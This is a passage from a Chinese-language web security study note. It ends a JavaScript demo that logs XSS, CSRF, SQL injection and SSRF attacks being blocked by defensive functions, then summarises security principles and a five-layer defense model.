console.log('   防御:', defender.defendXss(attacker.xssAttack1));
console.log('   结果: ✅ 脚本被清理\n');

// CSRF 攻防
console.log('2. CSRF 攻击 → 防御后:');
console.log('   攻击: 恶意表单自动提交');
console.log('   防御: Token + SameSite + Origin 三重验证');
console.log('   结果: ✅ 请求被拒绝\n');

// SQL 注入攻防
console.log('3. SQL 注入 → 防御后:');
console.log('   攻击:', attacker.sqliAttack);
const safeQuery = defender.defendSqli(attacker.sqliAttack);
console.log('   防御:', safeQuery.sql, safeQuery.params);
console.log('   结果: ✅ 参数化查询阻止注入\n');

// SSRF 攻防
console.log('4. SSRF 攻击 → 防御后:');
console.log('   攻击:', attacker.ssrfAttack);
console.log('   防御:', defender.defendSsrf(attacker.ssrfAttack));
console.log('   结果: ✅ 内网 IP 被阻止\n');

console.log('=== 所有攻击均被成功防御 ===');
```

---

## 总结

### 安全核心原则

1. **零信任** — 永远不要信任用户输入
2. **纵深防御** — 多层防护，即使一层被突破仍有其他层
3. **最小权限** — 只给必要的权限
4. **安全默认** — 默认配置应该是安全的
5. **持续监控** — 安全不是一次性的，需要持续监控和更新

### 安全分层模型

```
┌─────────────────────────────────────────┐
│  Layer 5: 监控与响应 (审计日志/告警)     │
├─────────────────────────────────────────┤
│  Layer 4: 基础设施 (HTTPS/WAF/CDN)      │
├─────────────────────────────────────────┤
│  Layer 3: 应用安全 (CSP/安全头/速率限制) │
├─────────────────────────────────────────┤
│  Layer 2: 输入输出安全 (验证/编码/清理)  │
├─────────────────────────────────────────┤
│  Layer 1: 认证授权 (密码/Session/Token)  │
└─────────────────────────────────────────┘
```

---

*训练完成时间: 2026-04-26 13:00*
*总代码量: ~1,500 行安全代码*
*覆盖主题: XSS / CSRF / SQL 注入 / SSRF / 文件上传 / CSP / 安全中间件 / 前端安全 SDK*
*下次复习: 2026-05-03*
